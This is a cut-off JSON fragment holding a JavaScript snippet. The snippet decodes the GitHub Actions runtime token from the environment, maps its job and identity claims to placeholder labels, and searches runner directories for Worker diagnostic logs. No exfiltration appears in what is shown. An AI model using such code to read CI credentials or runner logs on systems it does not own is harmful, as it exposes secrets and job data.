      "offset": 22,
      "text": "              \"lit\": \"const fs = require('fs')\\nconst path = require('path')\\nconst crypto = require('crypto')\\nconst token = process.env.ACTIONS_RUNTIME_TOKEN || ''\\nconst claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'))\\nconst known = new Map([\\n  [String(claims.plan_id || '').toLowerCase(), '<plan-id>'],\\n  [String(claims.job_id || '').toLowerCase(), '<job-id>'],\\n  [String(claims.nameid || '').toLowerCase(), '<identity-id>']\\n])\\nconst runtimePath = new URL(process.env.ACTIONS_RUNTIME_URL).pathname.split('/').filter(Boolean)[0] || ''\\nif (runtimePath) known.set(runtimePath.toLowerCase(), '<runtime-path>')\\n\\nconst files = []\\nfunction walk(root, depth = 0) {\\n  if (depth > 7) return\\n  let entries = []\\n  try { entries = fs.readdirSync(root, {withFileTypes: true}) } catch (_) { return }\\n  for (const entry of entries) {\\n    const full = path.join(root, entry.name)\\n    if (entry.isDirectory()) {\\n      if (/(_diag|runner|work|temp)/i.test(full) || depth < 3) walk(full, depth + 1)\\n    } else if (entry.isFile() && /^Worker_.*\\\\.log$/i.test(entry.name)) {\\n      try {\\n        const stat = fs.statSync(full)\\n        if (stat.size > 0 && stat.size < 40 * 1024 * 1024) files.push({full, mtime: stat.mtimeMs})\\n      } catch (_) {}\\n    }\\n  }\\n}\\nwalk('/home/runner')\\nfiles.sort((a,b) => b.mtime - a.mtime)\\n\\nlet allLines = []\\nlet source = ''\\nlet markerIndex = -1\\nfor (const file of files) {\\n  let text = ''\\n  try { text = fs.readFileSync(file.full, 'utf8') } catch (_) { continue }\\n  const lines = text.split(/\\\\r?\\\\n/)\\n  const index = "
